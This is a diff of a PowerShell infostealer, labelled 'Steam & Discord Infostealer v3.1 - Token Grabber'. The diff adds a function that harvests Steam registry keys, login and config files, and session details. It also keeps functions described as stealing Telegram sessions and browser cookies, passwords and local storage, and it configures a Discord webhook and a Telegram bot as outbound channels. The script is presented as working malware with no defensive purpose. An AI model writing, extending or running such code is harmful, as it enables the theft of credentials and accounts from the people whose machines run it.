@@ -1,4 +1,4 @@
-# Steam & Discord Infostealer v3.0 - Full Access
+# Steam & Discord Infostealer v3.1 - Token Grabber
 # Set parameters
 $discordWebhook = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
 $telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"
@@ -28,7 +28,39 @@ function Get-SteamData {
     }
 }
 
-# 3. Function to steal Telegram sessions
+# 3. NEW FUNCTION: Dedicated Steam Token Grabber
+function Get-SteamTokens {
+    $tokenFile = "$tempDir\Steam_Tokens.txt"
+    "=== Steam Tokens & Session Data ===`r`n" | Out-File $tokenFile -Append
+
+    # A. Extract from Registry
+    "Registry Tokens:`r`n" | Out-File $tokenFile -Append
+    try {
+        $regPath = "HKCU:\Software\Valve\Steam"
+        $regKeys = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
+        $regKeys | Out-File $tokenFile -Append
+    } catch {}
+
+    # B. Extract from config files
+    "`r`nConfig File Data:`r`n" | Out-File $tokenFile -Append
+    $configFiles = Get-ChildItem -Path $tempDir -Include *.vdf -Recurse
+    foreach ($file in $configFiles) {
+        if ($file.Name -like "*loginusers*" -or $file.Name -like "*config*") {
+            "--- $($file.Name) ---" | Out-File $tokenFile -Append
+            Get-Content $file.FullName | Out-File $tokenFile -Append
+        }
+    }
+
+    # C. Extract from process memory (active sessions)
+    "`r`nActive Session Info:`r`n" | Out-File $tokenFile -Append
+    $steamProcess = Get-Process steam -ErrorAction SilentlyContinue
+    if ($steamProcess) {
+        netstat -ano | findstr ":$steamProcess.Id" | Out-File $tokenFile -Append
+        $steamProcess.Modules | Where-Object {$_.ModuleName -like "*steam*"} | Select-Object ModuleName, FileName | Out-File $tokenFile -Append
+    }
+}
+
+# 4. Function to steal Telegram sessions
 function Get-TelegramData {
     $telegramPaths = @("$env:USERPROFILE\AppData\Roaming\Telegram Desktop", "$env:USERPROFILE\Documents\Telegram Desktop")
     foreach ($path in $telegramPaths) {
@@ -39,7 +71,7 @@ function Get-TelegramData {
     }
 }
 
-# 4. Function to steal cookies & passwords from all browsers
+# 5. Function to steal cookies & passwords from all browsers
 function Get-BrowserData {
     $browsers = @("Chrome", "MicrosoftEdge", "Firefox", "Opera", "YandexBrowser")
     foreach ($browser in $browsers) {
@@ -51,20 +83,6 @@ function Get-BrowserData {
                 Copy-Item "$dataPath\Local Storage" "$tempDir\${browser}_LocalStorage" -Recurse -Force -ErrorAction SilentlyContinue
             }
         } catch {}
-    }
-}
-
-# 5. Function to extract Steam process memory for tokens
-function Get-SteamMemory {
-    $steamProcess = Get-Process steam -ErrorAction SilentlyContinue
-    if ($steamProcess) {
-        # Attempt to dump memory of Steam process (will require SysInternals procdump or similar)
-        # This is a placeholder - actual implementation would require external tools
-        $steamProcess | Select-Object Id, StartTime, Path | Out-File "$tempDir\Steam_Process_Info.txt"
-        # Command to try and dump process memory if tools are present
-        if (Test-Path "$env:SystemRoot\procdump.exe") {
-            & procdump.exe -ma $steamProcess.Id "$tempDir\steam_memory.dmp" | Out-File "$tempDir\Memory_Dump_Log.txt"
-        }
     }
 }
 
@@ -117,9 +135,9 @@ function Send-TelegramMessage {
 function Execute-Stealer {
     Get-CommandHistory
     Get-SteamData
+    Get-SteamTokens
     Get-TelegramData
     Get-BrowserData
-    Get-SteamMemory
     Get-SystemInfo
     Compress-Data
 }
